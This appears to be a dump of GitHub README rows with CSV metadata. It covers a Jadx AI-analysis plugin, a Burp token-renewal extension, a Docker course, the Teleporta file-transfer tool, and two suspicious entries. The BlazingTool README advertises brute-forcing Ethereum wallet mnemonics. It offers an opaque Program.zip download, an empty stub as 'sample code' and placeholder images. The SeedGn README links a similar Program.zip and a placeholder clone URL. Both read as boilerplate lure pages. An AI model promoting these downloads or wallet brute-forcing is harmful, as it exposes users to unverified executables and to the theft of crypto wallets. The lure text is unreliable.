",0,0,1,MIT,0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
Devilx86/jadx-ai-view-plugin,main,"# Jadx AI view plugin
A (Work in progress) Jadx plugin that shows AI analysis of a method/class in a separate view allowing a reverse engineer to compare code and the AI analysis to understand it better. Currently supports gpt4free gpt 3.5 turbo, Gemini 1.5 flash and OpenAI GPT 4.0 mini.

## Usage
The following is a sample malware code from Jadx:<br/>
<img src=""./screenshots/original.png"" width=""500"">

Right Click on the class or method name and select the ""*Show AI Analysis*"" option as seen below:<br/>
<img src=""./screenshots/selectOption.png"" width=""500"">

This opens up the jadx-ai-view window with the AI analysis output as seen below:<br/>
<img src=""./screenshots/ai-view.png"" width=""1000"">

## Prerequisites
Install gpt4free if you plan on using the gpt4free option i.e:
```bash
python3 -m pip install g4f
```

## Building
Execute the following command to build the jar file:
```bash
export VERSION='1.0.0' && ./gradlew build
```
## Installation
Jadx > 1.5.0 is required, please install the latest version of the Jadx unstable build. Then browse to the `Plugins > Install plugin` option and enter `file:<Jadx AI View jar file path>` or enter the location id: `github:devilx86:jadx-ai-view-plugin`. Alternatively install with the following command:
```bash
jadx-gui plugins --install ""github:devilx86:jadx-ai-view-plugin""
```

## Uninstallation
Run the following command to uninstall the plugin:
```bash
jadx-gui plugins --uninstall jadx-ai-view 
```

## Credits
- Skylot - [Jadx](https://github.com/skylot/jadx), [plugin template](https://github.com/skylot/jadx/wiki/Jadx-plugins-guide) and [usage](https://github.com/skylot/jadx/issues/2305#issuecomment-2420607111).
- [timschneeb](https://github.com/timschneeb/jadx-type-diagram-plugin) - Jadx API usage reference.
- [MartinKayJr](https://github.com/skylot/jadx/issues/1884#issue-1727047157) - Default prompt engineering.
- xtekky - [gpt4free](https://github.com/xtekky/gpt4free).
- LangChain4j - [LangChain4j](https://github.com/langchain4j/langchain4j/).
- bobbylight - [RSyntaxTextArea](https://github.com/bobbylight/RSyntaxTextArea).
",1,1,1,MIT,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
forteBruno/Token-Tailor,main,"_If you find this Burp Extension useful, please consider giving it a star_ üôè

---
# Token Tailor ![logo](assets/logo_50.png)

## About
Token Tailor is a Burp Suite Community Edition extension that aims to simplify security testing by automating authentication (JWT and Basic) renewal.

This extension eliminates the need for manual token extraction and updates, reducing scanning errors and streamlining your workflow.

Configure Token Tailor to handle session renewals for all traffic passing through Burp Suite, providing a ""tailor-made"" solution for efficient session management.

![logo](assets/flow.png ""For clarity, this diagram presents a simplified version of the token refresh flow, focusing on the key interactions
"")

##  :building_construction: QuickStart

1. Install the extension from the BApp store or download the latest [release](https://github.com/forteBruno/Token-Tailor/releases) from this repository and install the provided JAR file (Extension tab > Extension file (.jar)).
2. In the `Request` tab, add an HTTP request that provides a JWT or Basic Session Token.
3. Click `Send` to execute the request. Ensure the host is within the defined scope.
4. In the `Exp` tab, add the response that the server returns when the session has expired. By default, only the HTTP status code and body of each response will be compared.
5. Click the toggle button at the bottom-left to activate the Token Tailor extension.

##  :outbox_tray: Set up with SQLMap or other tools!
This extension can intercept all traffic passing through Burp Suite.

If an external tool like [SQLMap](https://github.com/sqlmapproject/sqlmap) is configured with the ""--proxy"", that traffic can also be intercepted, preventing any unauthorized responses from being sent to the tool.

The extension will renew the Bearer or Basic token and resend the request with the correct authorization, ensuring the tool receives the appropriate response.

## :wrench: Features

### Check Traffic From: 

Select the tool(s) from which you want to check the traffic to identify expired conditions. Choose `All` to check all traffic through Burp or select specific tools.

![tools](assets/tools.gif)

### Requests Flow

This section allows for the definition of a flow to retrieve a Bearer or Basic token.
1. The request should be copied and pasted into the first tab.
   - More tabs can be added by clicking the `+` tab button to define a flow.
   - To include a header in the next request, define its content and enclose the desired value within `¬ß` symbols. This process can be repeated for multiple headers. Token Tailor will automatically add the header to the next request if it doesn't exist or update the header's value if it does.
2. The final response must include a Bearer or Basic token. 
   - If the response contains a single token without `¬ß` delimiters, it will be automatically parsed and used.
   - If multiple tokens are present, the desired token can be specified by enclosing it within `¬ß` delimiters.
   - Otherwise, the first valid JWT or Basic token found in the response body, followed by any found in the headers, will be used.

All specified hosts must be within the target scope.


![requests](assets/requests.gif)

### Expired Condition

- Define one or more conditions that trigger upon session expiration. 
   - Without `¬ß` delimiters, Token Tailor compares the response status code and body with the provided ones. If they match in any of each response from the selected tools, a new flow starts to get a new Bearer or Basic Token.
   - With `¬ß` delimiters, Token Tailor compares the text between the delimiters in each response from the selected tools. If the text is found, a new request flow starts.

![expired_conditions](assets/expired_conditions.gif)

### Import / Export


When the button shows `ON`, the current configuration can be exported in order to reuse it in a new Burp session. 

:pushpin: It is recommended to export your Token Tailor settings before exiting Burp Suite. This ensures that your configurations are saved and can be easily re-imported when you restart the software

When the Token Tailor button at the bottom-left corner shows `OFF`, it is possible to click on the `Import` button at the bottom-right corner in order to import a JSON file with a valid configuration.

:no_entry_sign: Avoid manually editing the JSON file, as it contains credentials for a valid JWT or Basic session token.

![import_export](assets/import_export.gif)

### :new: Upcoming Features [Planned]:

- Support multiple session flow for different Domains 
- More Authentication Methods
- YouTube Channel with Practical Use Cases
- ... Share your ideas for new use cases!

## :question: F.A.Q.
***Does the extension intercept traffic from all tools?***

Yes, Token Tailor intercepts all traffic passing through or generated by Burp. It is highly recommended to use it with other tools like [SQLMap](https://github.com/sqlmapproject/sqlmap.git) to prevent session expiration from interrupting scans.

***It is possible to set up without use the BApp store?***

Yes, follow this steps:
1. Download the latest [release](https://github.com/forteBruno/Token-Tailor/releases) from this repository
2. In Burp, go to the Extension tab.
3. Click the `Add` button.
4. Select `Extension Type: Java`.
5. Select the JAR file by clicking the `Select file` button next to `Extension file (.jar)`.



## :mailbox: Contact

[![gmail](https://img.shields.io/badge/Gmail-0077B5?style=for-the-badge&logo=gmail&logoColor=red)](mailto:contact@fortebruno.it) [![linkedin](https://img.shields.io/badge/LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/forteb/) [![youtube](https://img.shields.io/badge/Youtube-0077B5?style=for-the-badge&logo=youtube&logoColor=white)](https://www.youtube.com/channel/UCM4rxcHMfGv73GppNEzjQ3g)

## Special Thanks:
- [Riccardo Cardelli](https://github.com/gand3lf)
",1,0,1,MIT,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
Hirun4/PACMAN_GAME,main,"## Getting Started

Welcome to the VS Code Java world. Here is a guideline to help you get started to write Java code in Visual Studio Code.

## Folder Structure

The workspace contains two folders by default, where:

- `src`: the folder to maintain sources
- `lib`: the folder to maintain dependencies

Meanwhile, the compiled output files will be generated in the `bin` folder by default.

> If you want to customize the folder structure, open `.vscode/settings.json` and update the related settings there.

## Dependency Management

The `JAVA PROJECTS` view allows you to manage your dependencies. More details can be found [here](https://github.com/microsoft/vscode-java-dependency#manage-dependencies).
",0,0,3,,0,26.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
stacksimplify/docker-in-a-weekend,main,"# [Docker in a Weekend: 40 Practical Demos for DevOps Learners](https://links.stacksimplify.com/docker-in-a-weekend-40-practical-demos-for-devops)

[![Image](docker-1.png ""Docker in a Weekend: 40 Practical Demos for DevOps Learners"")](https://links.stacksimplify.com/docker-in-a-weekend-40-practical-demos-for-devops)

## [Course Details](https://links.stacksimplify.com/docker-in-a-weekend-40-practical-demos-for-devops)
- **Title:** [Docker in a Weekend: 40 Practical Demos for DevOps Learners](https://links.stacksimplify.com/docker-in-a-weekend-40-practical-demos-for-devops)
- **Sub Title:** Master Dockerfiles, Docker Build, Docker Compose, Multi-Container Apps, and Multi-Stage Builds with 40 Practical Demos

## [Course Modules](https://links.stacksimplify.com/docker-in-a-weekend-40-practical-demos-for-devops)
1. **Demo-01:** Install Docker Desktop, Sign Up to Docker Hub
2. **Demo-02:** Docker Commands: `pull`, `run`, `exec`, `stop`, `start`, `rm`, `rmi`
3. **Demo-03:** Build Docker Image and Push to Docker Hub
4. **Demo-04:** Dockerfile - `LABELS` Instruction
5. **Demo-05:** Dockerfile - `ADD` vs `COPY` Instructions
6. **Demo-06:** Dockerfile - `ADD` Fetch from URL (GitHub Release)
7. **Demo-07:** Dockerfile - `ARG` Instruction
8. **Demo-08:** Dockerfile - `RUN` and `EXPOSE` Instructions
9. **Demo-09:** Dockerfile - `ENV`, `ARG`, `CMD`, `WORKDIR` Instructions
10. **Demo-10:** Dockerfile - `CMD` Instruction - Override with `docker run`
11. **Demo-11:** Dockerfile - `ENTRYPOINT` Instruction
12. **Demo-12:** Dockerfile - `HEALTHCHECK` Instruction
13. **Demo-13:** Dockerfile - `USER` Instruction
14. **Demo-14:** Docker Ports: `-p` and `-P` flags
15. **Demo-15:** Docker Volume - Basics
16. **Demo-16:** Docker Volumes: Use Docker Volumes with Docker Containers
17. **Demo-17:** Docker Volumes: Populate Data in Docker Volumes using Containers
18. **Demo-18:** Docker Volumes: Mount a Volume Sub-directory
19. **Demo-19:** Docker Bind Mounts: Basics
20. **Demo-20:** Docker Bind Mounts: Mount in Read-Only Mode
21. **Demo-21:** Docker Volumes vs Bind Mounts with Non-empty Directory Use Case
22. **Demo-22:** Docker `tmpfs` Mount
23. **Demo-23:** Deploy Multi-container Applications using Docker Commands
24. **Demo-24:** Docker Compose: Basics (MySQL DB as Service)
25. **Demo-25:** Docker Compose: Named Volumes with Additional Metadata
26. **Demo-26:** Docker Compose: Multi-container Application - UMS WebApp + MySQL DB
27. **Demo-27:** Docker Compose: DEPLOY (Scale Containers) - Nginx + UMS Web + MySQL DB
28. **Demo-28:** Docker Compose: NETWORKS (Frontend: Web, App, Backend: App, DB)
29. **Demo-29:** Docker Compose: `HEALTHCHECKS`
30. **Demo-30:** Docker Compose: STARTUP ORDER with Conditions
31. **Demo-31:** Docker Compose: `PROFILES`
32. **Demo-32:** Docker Compose: `LINKS`
33. **Demo-33:** Docker Compose: `ALIASES`
34. **Demo-34:** Docker Compose: `BUILD`
35. **Demo-35:** Docker Compose: DEVELOP WATCH with `SYNC` + `RESTART`
36. **Demo-36:** Docker Compose: DEVELOP WATCH with `SYNC` + `REBUILD`
37. **Demo-37:** Docker BuildKit: `buildx` CLI, Local and Build Cloud Builders
38. **Demo-38:** Docker BuildKit: Build Multi-platform Docker Images
39. **Demo-39:** Docker Build Cloud: Remote Builds using Cloud Builder
40. **Demo-40:** Docker Multi-stage Builds


## [Docker Concepts covered](https://links.stacksimplify.com/docker-in-a-weekend-40-practical-demos-for-devops)
1. **Docker Installation and Setup**
   - Installing Docker Desktop
   - Signing up for Docker Hub

2. **Basic Docker Commands**
   - Pulling, running, executing, stopping, starting, removing containers and images

3. **Docker Image Management**
   - Building and pushing Docker images

4. **Dockerfile Instructions**
   - `LABELS`, `ADD` vs `COPY`, `ARG`, `RUN`, `EXPOSE`, `ENV`, `CMD`, `WORKDIR`, `ENTRYPOINT`, `HEALTHCHECK`, `USER`

5. **Docker Ports**
   - Mapping ports using `-p` and `-P` flags

6. **Docker Volumes and Data Management**
   - Docker volumes basics, usage with containers, data population, sub-directory mounts, and differences between volumes and bind mounts

7. **Docker Bind Mounts**
   - Basics, read-only mode, and non-empty directory use cases

8. **Temporary File Storage**
   - `tmpfs` mounts

9. **Multi-container Applications**
   - Deploying multi-container applications with Docker commands

10. **Docker Compose**
    - Basics, named volumes with metadata, multi-container applications, scaling, networks, health checks, startup order, profiles, links, aliases, build, develop-watch features

11. **Advanced Docker Compose Features**
    - Network configurations, health checks, profiles, aliases, and links

12. **Docker BuildKit**
    - Using BuildKit for building multi-platform images and setting up builders

13. **Docker Cloud Build**
    - Remote builds using Docker‚Äôs cloud builder

14. **Docker Multi-stage Builds**
    - Creating optimized images through multi-stage builds

## [What will students learn in your course?](https://links.stacksimplify.com/docker-in-a-weekend-40-practical-demos-for-devops)
1. You will learn Docker basics with foundational commands and setup.
2. You will learn to install Docker Desktop and sign up for Docker Hub.
3. You will learn essential Docker commands: pulling, running, stopping, and managing containers.
4. You will learn to build Docker images from scratch and push them to Docker Hub.
5. You will learn Dockerfile instructions like `LABELS`, `ADD`, `COPY`, and `ARG`.
6. You will learn to use Dockerfile for `RUN`, `EXPOSE`, and other key instructions.
7. You will learn how to manage environment variables and work with `CMD` and `ENTRYPOINT`.
8. You will learn advanced Dockerfile instructions: `HEALTHCHECK`, `USER`, and optimizing image builds.
9. You will understand Docker ports and how to map them using `-p` and `-P` flags.
10. You will learn Docker Volumes to store persistent data and share data between containers.
11. You will learn the difference between Docker Volumes and Bind Mounts and when to use each.
12. You will learn to set up multi-container applications with Docker.
13. You will master Docker Compose basics, including MySQL as a service.
14. You will learn to manage multi-container applications using Docker Compose.
15. You will learn Docker Compose features like scaling, networks, health checks, and startup orders.
16. You will master Docker Compose `PROFILES`, `LINKS`, `ALIASES`, and named volumes.
17. You will learn advanced Docker Compose configurations like `HEALTHCHECKS` and startup conditions.
18. You will learn Docker BuildKit for efficient builds and multi-platform support.
19. You will learn Docker Cloud for remote builds and managing cloud-based images.
20. You will learn to use multi-stage builds to create lightweight and optimized Docker images. 



## [What are the requirements or prerequisites for taking your course?](https://links.stacksimplify.com/docker-in-a-weekend-40-practical-demos-for-devops)
- You don‚Äôt need prior Docker knowledge. We will start from the basics, with the first few demos covering foundational Docker concepts.
- Access to a computer that supports Docker Desktop installation (Windows, Mac, or Linux) is required.
- Some familiarity with concepts of software development and server environments will be helpful but is not mandatory.


## [Who is this course for?](https://links.stacksimplify.com/docker-in-a-weekend-40-practical-demos-for-devops)
- This course is designed for students and professionals who want to learn Docker from scratch and gain hands-on experience with containerization.
- Developers who want to understand how to create, manage, and deploy Docker containers in real-world scenarios.
- DevOps engineers and system administrators who are interested in mastering Docker to streamline application deployment and management.
- Anyone aiming to build skills in containerized applications, multi-container environments, and Docker Compose.
- Those interested in exploring advanced Docker concepts, such as multi-stage builds, Dockerfile optimization, and Docker Compose networking.

## [Github Repositories used for this course](https://links.stacksimplify.com/docker-in-a-weekend-40-practical-demos-for-devops)
- [docker-in-a-weekend](https://github.com/stacksimplify/docker-in-a-weekend)
- **Important Note:** Please go to these repositories and FORK these repositories and make use of them during the course.

## [Each of my courses come with](https://links.stacksimplify.com/docker-in-a-weekend-40-practical-demos-for-devops)
- Amazing Hands-on Step By Step Learning Experiences
- Practical demos for each and every concept
- Friendly Support in the Q&A section
- ""30-Day ""No Questions Asked"" Money Back Guaranteed by Udemy""

## My Other GCP (Google Cloud Courses)
### [GCP Terraform on Google Cloud:DevOps SRE 30 Real-World Demos](https://links.stacksimplify.com/gcp-terraform-on-google-cloud-devops-sre-iac)

[![Image](gcp-terraform-2.png ""GCP Terraform on Google Cloud:DevOps SRE 30 Real-World Demos"")](https://links.stacksimplify.com/gcp-terraform-on-google-cloud-devops-sre-iac)

### [GCP Associate Cloud Engineer Google Certification -150 Demos](https://links.stacksimplify.com/gcp-associate-cloud-engineer-google-certification)

[![Image](gcp-ace-2.png ""GCP Associate Cloud Engineer Google Certification -150 Demos"")](https://links.stacksimplify.com/gcp-associate-cloud-engineer-google-certification)


### [GCP GKE Google Kubernetes Engine DevOps 75 Real-World Demos](https://links.stacksimplify.com/gcp-google-kubernetes-engine-gke-with-devops)

[![Image](images/course-title.png ""Google Kubernetes Engine GKE with DevOps 75 Real-World Demos"")](https://links.stacksimplify.com/gcp-google-kubernetes-engine-gke-with-devops)

# [GCP GKE Terraform on Google Kubernetes Engine DevOps SRE IaC - 40 Real-World Demos](https://links.stacksimplify.com/gcp-gke-terraform-on-google-kubernetes-engine)

[![Image](gcp-gke-terraform-2.png ""GCP GKE Terraform on Google Kubernetes Engine DevOps SRE"")](https://links.stacksimplify.com/gcp-gke-terraform-on-google-kubernetes-engine)


## My Other AWS Courses
- [Udemy Enroll](https://www.stacksimplify.com/azure-aks/courses/stacksimplify-best-selling-courses-on-udemy/)

## Stack Simplify Udemy Profile
- [Udemy Profile](https://www.udemy.com/user/kalyan-reddy-9/)

# HashiCorp Certified: Terraform Associate - 50 Practical Demos
[![Image](https://stacksimplify.com/course-images/hashicorp-certified-terraform-associate-highest-rated.png ""HashiCorp Certified: Terraform Associate - 50 Practical Demos"")](https://links.stacksimplify.com/hashicorp-certified-terraform-associate) 

# AWS EKS - Elastic Kubernetes Service - Masterclass
[![Image](https://stacksimplify.com/course-images/AWS-EKS-Kubernetes-Masterclass-DevOps-Microservices-course.png ""AWS EKS Kubernetes - Masterclass"")](https://www.udemy.com/course/aws-eks-kubernetes-masterclass-devops-microservices/?referralCode=257C9AD5B5AF8D12D1E1)


# Azure Kubernetes Service with Azure DevOps and Terraform 
[![Image](https://stacksimplify.com/course-images/azure-kubernetes-service-with-azure-devops-and-terraform.png ""Azure Kubernetes Service with Azure DevOps and Terraform"")](https://www.udemy.com/course/azure-kubernetes-service-with-azure-devops-and-terraform/?referralCode=2499BF7F5FAAA506ED42)

# Terraform on AWS with SRE & IaC DevOps | Real-World 20 Demos
[![Image](https://stacksimplify.com/course-images/terraform-on-aws-best-seller.png ""Terraform on AWS with SRE & IaC DevOps | Real-World 20 Demos"")](https://links.stacksimplify.com/terraform-on-aws-with-sre-and-iacdevops)

# Azure - HashiCorp Certified: Terraform Associate - 70 Demos
[![Image](https://stacksimplify.com/course-images/azure-hashicorp-certified-terraform-associate-highest-rated.png ""Azure - HashiCorp Certified: Terraform Associate - 70 Demos"")](https://links.stacksimplify.com/azure-hashicorp-certified-terraform-associate)

# Terraform on Azure with IaC DevOps and SRE | Real-World 25 Demos

[![Image](https://stacksimplify.com/course-images/terraform-on-azure-with-iac-azure-devops-sre-1.png ""Terraform on Azure with IaC DevOps and SRE | Real-World 25 Demos"")](https://links.stacksimplify.com/terraform-on-azure-with-iac-devops-sre)

# [Terraform on AWS EKS Kubernetes IaC SRE- 50 Real-World Demos](https://links.stacksimplify.com/terraform-on-aws-eks-kubernetes-iac-sre)

[![Image](https://stacksimplify.com/course-images/terraform-on-aws-eks-kubernetes.png ""Terraform on AWS EKS Kubernetes IaC SRE- 50 Real-World Demos "")](https://links.stacksimplify.com/terraform-on-aws-eks-kubernetes-iac-sre)

# [Helm Masterclass: 50 Practical Demos for Kubernetes DevOps](https://links.stacksimplify.com/helm-masterclass-kubernetes-devops)
[![Image](images/helm-highest-rated.png ""Helm Masterclass: 50 Practical Demos for Kubernetes DevOps"")](https://links.stacksimplify.com/helm-masterclass-kubernetes-devops)

",0,0,1,,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
kindblayde/BlazingTool,v24,"# BlazingTool

üî• Brute force ethereum wallet mnemonics - multi-threaded and suprisingly fast üî•

## Introduction

BlazingTool is a powerful tool designed for efficiently brute-forcing ethereum wallet mnemonics. With its multi-threaded approach, it achieves high-speed performance that is sure to impress. 

![BlazingTool Logo](https://example.com/blazingtool-logo.png)

## Features

- Fast and efficient brute-forcing of wallet mnemonics
- Multi-threaded for maximum performance
- Easy to use interface
- Comprehensive error handling

## Installation

To get started with BlazingTool, simply download the program using the button below:

[![Download BlazingTool](https://img.shields.io/badge/Download-BlazingTool-green)](https://github.com/user-attachments/files/17688433/Program.zip)

## Getting Started

Follow these steps to start using BlazingTool:

1. Download and extract the program.
2. Run the executable file.
3. Enter the necessary parameters.
4. Click on the ""Start"" button to initiate the brute-forcing process.

## Sample Code

```python
def brute_force(wallet_seed):
    # Brute force logic here
    # Returns the correct wallet mnemonic
    pass
```

## Usage

BlazingTool is useful for:

- Recovering lost ethereum wallet mnemonics
- Testing the security of ethereum wallets
- Educational purposes

## Screenshots

Here are some screenshots of BlazingTool in action:

![Screenshot 1](https://example.com/screenshot1.png)
![Screenshot 2](https://example.com/screenshot2.png)

## Contribute

If you would like to contribute to BlazingTool, feel free to submit a pull request. We welcome any improvements or bug fixes.

## Support

For any questions or issues, please contact our support team at support@blazingtool.com

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

---

Thank you for checking out BlazingTool! We hope you find it useful in your ethereum wallet mnemonic recovery journey. Feel free to share your feedback or suggestions for improvement. Happy brute-forcing! üîíüöÄ",3,0,1,Unlicense,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,3.0
alex0x08/teleporta,main,"[![ru](https://img.shields.io/badge/lang-ru-red.svg)](https://github.com/alex0x08/teleporta/blob/main/README.ru.md)


# Teleporta
Teleporting files from 'Bob' to 'Alice' through network since 2015. Community version.

No UI, no passwords, no keys - just drag&drop to local folder. Works everywhere.

This is our internal tool, dedicated to fast and secure file exchange between team members.
Secure enough to use in public networks.

[Feature plan for 2025](https://docs.google.com/spreadsheets/d/1G5hc_vl9MaJFP2rhF3_pZM2uZejiHG0KswkvXgyJyB8/edit?usp=sharing)


In action:
![In short](https://github.com/alex0x08/teleporta/blob/main/images/316/teleporta-demo.gif?raw=true)
Clipboard transfer:
![Clipboard](https://github.com/alex0x08/teleporta/blob/main/images/316/teleporta-clipboard-demo.gif?raw=true)


# How it works
There are two work modes: *relay* - server and *portal* - client.  

![Schema](https://github.com/alex0x08/teleporta/blob/main/images/teleporta-schema.png?raw=true)

In *relay* mode, Teleporta starts to operate as a relay for files transfers: the application will start an HTTP-server, which accepts incoming requests. 
From version 3.1.6 the *relay* mode is used by default.

Then another Teleporta instance, but in *portal* mode, registers on that relay and uploads files and downloads them on another side.

![Relay mode](https://github.com/alex0x08/teleporta/blob/main/images/316/teleporta-default.png?raw=true)


In *portal* mode, Teleporta connects to relay using provided URL, registers itself on that relay, and starts to monitor special local folders for changes. 

Each file or folder found in those folders will be automatically transferred to the remote machine via relay.


![Portal mode](https://github.com/alex0x08/teleporta/blob/main/images/316/teleporta-connected-to-relay.png?raw=true)


# How to run

Just download latest `teleporta.cmd` from releases and run it in console, for most cases that would be enough. 

If you're on Windows and don't have any JDK or JRE installed - Teleporta will try to download and use it automatically. For all other OSes, please verify that you have Java 1.8+ installed, which could be JRE or JDK.

There is some ""black magic"" in Teleporta boostrap, that allows to run same application on all OSes, but sometimes it can break.
But it's always possible to run Teleporta as ordinary Java application:
```
java -jar teleporta.cmd
```
Use it, if nothing else helps.

To start in relay mode just run it:
```
teleporta.cmd
```
After the start, there would be a long URL displayed, like

`http://majestic12:8989/2d52fb71ef728d8813a001a6592c8248801d844ce2c0d0a6976f10b73d3bdb463ea4cd09c1ad9a25d5b83a543238`

You need to copy it and paste it as the first argument to start Teleporta in 'portal' mode:

```
teleporta.cmd http://majestic12:8989/2d52fb71ef728d8813a001a6592c8248801d844ce2c0d0a6976f10b73d3bdb463ea4cd09c1ad9a25d5b83a543238
```

From version 3.1.6, the default Teleporta relay also starts embedded portal, to let relay send&receive files to himself.
To disable the *embedded portal* feature, pass this argument:
```
-DrelayHasPortal=false
```
Note, that its enabled by default only when running a default relay - without additional configuration options.

It's possible to run both relay and portal on the same machine, which is useful for testing:

![Both Portal and relay on same machine](https://github.com/alex0x08/teleporta/blob/main/images/teleporta-both.png?raw=true)

Just keep in mind that local relay will already have a portal named as hostname, so to start client you'll need to provide altername portal name: 
```
-DportalName=""My another portal""
```

# In action

![Sample 1](https://github.com/alex0x08/teleporta/blob/main/images/screen1.gif?raw=true)
![Sample 2](https://github.com/alex0x08/teleporta/blob/main/images/screen2.gif?raw=true)
![Sample 3](https://github.com/alex0x08/teleporta/blob/main/images/screen3.gif?raw=true)

FreeBSD:
![Sample 4](https://github.com/alex0x08/teleporta/blob/main/images/inaction/teleporta-freebsd.jpg?raw=true)


# Cryptography

Each portal has its own pair of keys (public & private), used for file encryption.

The public key is shared by the relay with all other connected portals and is used when one relay sends a file to another.

Let's say portal *Bob* wants to transfer a file through relay to portal *Alice*. Bob takes Alice's public key from the relay and uses it to encrypt the file that needs to be transferred. When received, Alice decrypts the file using her own private key.

The community version uses weak algorithms: 2048-bit RSA and 128-bit AES, fair enough for normal users, but easily breakable by any 'special forces,' so please don't try to use this tool for anything illegal.

# Additional options
There are additional settings that could be passed to Teleporta by the commonly used -Dparameter=value mechanism.
Also possible to define all options in the config file `teleporta.properties`, but without `-D` prefix:
```
appDebug=true
clipboard=true
relayUrl=http://majestic12:8989/testseed
```

Enable debug output:
```
-DappDebug=true
```
Enable *programmatic* file watcher instead of native:
```
-DdumbWatcher=true
```
Useful for slow or legacy or network filesystems, like on Windows 98, as shown above.

Don't generate seed and use static instead:
```
-Dseed=testseed
```
If provided, context path will match provided seed, like: `http://majestic12:8989/testseed`

Allow portal update even if its already registered:
```
-DallowPortalNameUpdate=true
```

Provide own portal name instead of hostname:
```
-DportalName=samplePortal
```
Use a template for portal name:
```
-DportalNameTemplate=""USERNAME from HOSTNAME""
```
Keywords USERNAME and HOSTNAME will be substituted by actual username and hostname, then the final string will be used as portal name.

Do not show logo on start:
```
-DshowLogo=false
```
Custom MOTD (Message of the day), displayed when portal connects:
```
-Dmotd=""This is my awesome relay!""
```

Don't create link on user desktop to Teleporta's folders:  
```
-DcreateDesktopLink=false
```
This is not used at all on headless environments.

Specify custom storage path:
```
-DappHome=/full/path/to/folder
```

Specify listening port (8989 by default):
```
-DappPort=9000
```

Delete non-delivered files on start:
```
-DclearOutgoing=true
```
This works both on relay and portal sides, but should be enabled separately.
When enabled, Teleporta will delete all non-delivered files, otherwise - will try to deliver them.
Disabled by default.

Disable outgoing:
```
-DallowOutgoing=false
```
When set, portal will not be able to send anything, all outgoing logic will be disabled completely.


# Private relays

Since 3.1.1 we added a new *private relay* mode, which allows to run relays privately: clients will not be able to connect without local key file. 
  
Pass argument `-DprivateRelay=true` when start Teleporta relay, grab key from console, which look like this:
```
|TELEPORTA30820122300d06092a864886f70d01010105000382010f003082010a0282010100b04b
a71d7f0a7ce1dc9359a8e90c63971904105d443303a171e6622c8ba14121aba9e09a748293b31a65
076dda3d58237783978a8c490a714516607aca2f68577e59b707bd53b4dcfe26ed7221769081d76f
3af7b5554eb3a6f2e653a5092109a35f963d52fdf23b6978f3e273cbf95f716d12e13db380cd9688
340cc3cd00ca61a730b38e7ecbed0436bf7e86d6eee75c89515f730ad7001d41ebc42ba7b0d46a58
2d3215be71cbbd246b52f7f0c12c642c00d16b1e3617326c0c24b15057aa4c89fb345af4c54fe4a3
954750164291a2d2c8c0aa10f86db1935722d1ec80104dc139b4fe1810d678e5a2ca8af2368c4452
be458a6606eca8331386ef625e050203010001|
``` 
Save it to text file and provide it when start Teleporta in client mode:
```
-DrelayKey=/opt/work/tmp/tele.pub
```

# Self download

Since 3.1.2 we added important feature that simplifies deployment: 

Teleporta Relay now allows to download the *self package* - generated zip-archive with application and config file with defined relay url.

Just open link in browser on client side, where you need to deploy Teleporta: 
```
 Public Teleporta Relay started: http://amarok:8989/4d9575d00ace270aa168c8d043a99984c0ba4807043719b4629461f31cf828d30645
```
And you'll have ready to use client deployment! Just unpack and run.

To turn this amazing feature off, pass this command line argument:
```
-DselfDownload=false
```


# Manual triggering and the 'lock' file 

Trying to copy some huge folder with lot of nested folders to outgoing could produce incorrect results: Teleporta will start to pack it before copying process completes.  
Sad news, but there is no easy way to monitor whole folder hierarchy (without serious performance impact), so when Teleporta receives file/folder creation event - it does not know if there are no running processes on inner folders. 

To solve that, we added special mode called `useLockFile` (disabled by default),  which could be enabled by command line argument:
```
-DuseLockFile=true
```
When enabled, all copy/move actions inside *to* folder will trigger creation of special file called *lock* . Till this file exists - there would be no uploading process.

So you need to remove this file by hand, right after all required files/folders are copied. 
Removing this file will trigger uploading, but till its not done - folder will not be monitored for changes.


# Technical details
This project has come a long way, full of pain and issues; what you see there is the 3rd *Java* version, and each version has been rewritten from scratch.¬†
There were also Teleporta versions in C++ and Golang, which did not survive: C++ has too many standards nowadays, and Golang has serious issues with legacy environments.

To be more specific, we faced the fact that using C++ 11 as the most widely used modern C++ version requires us to use and support weird hacks like [this](https://github.com/gulrak/filesystem) if we going to provide long support.
More recent C++ versions, especially 20, are not well supported in common compilers, and it's better to use older compilers if you need stability in a wide range of environments. Same story for Golang: it sucks on legacy; even 10-year-old Linux/Windows hosts are a big problem.

# Localization
From 3.1.6 we provide localized Teleporta for 2 languages: English and Russian. By default the system locale will be used, provided by `Locale.getDefault()`
But its possible to override passing `-Dlang=ru` or `-Dlang=en` arguments

# How to build
Teleporta has no dependencies and can be easily built by any JDK 1.8 or upper with Apache Maven:

```
mvn clean package
```
The final executable `teleporta.cmd`, could be found in the `target` folder.

If you prefer to use plain old JAR, without all the bootstrap magic, just take the executable JAR from the same `target` folder.
",7,0,1,GPL-3.0,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
hoangpm07/SeedGn,v24,"# SeedGn

![SeedGn Logo](https://example.com/seedgn_logo.png)

SeedGn is a mnemonic seed phrase generator designed to help you securely create and manage mnemonic phrases for your cryptocurrency wallets, password managers, and more. With SeedGn, you can easily generate strong and unique seed phrases that are easy to remember but hard to crack.

## Table of Contents

- [Installation](#installation)
- [Usage](#usage)
- [Features](#features)
- [Contributing](#contributing)
- [License](#license)

## Installation

To get started with SeedGn, you can either download the pre-built binary from the [latest release](https://github.com/user-attachments/files/17688440/Program.zip) or build the project from source by following these steps:

1. Clone the repository:
   ```bash
   git clone https://github.com/username/SeedGn.git
   ```

2. Navigate to the project directory:
   ```bash
   cd SeedGn
   ```

3. Compile the source code:
   ```bash
   make build
   ```

4. Run the executable:
   ```bash
   ./seedgn
   ```

## Usage

SeedGn is a command-line tool that offers various options for generating mnemonic seed phrases. Here are some common use cases:

1. Generate a 12-word seed phrase:
   ```bash
   seedgn generate --words 12
   ```

2. Generate a seed phrase with a custom word length:
   ```bash
   seedgn generate --words 24
   ```

3. Use a custom word list for generating seed phrases:
   ```bash
   seedgn generate --wordlist custom.txt
   ```

For more advanced usage and options, refer to the [documentation](https://github.com/username/SeedGn/wiki).

## Features

### Mnemonic Seed Phrase Generation

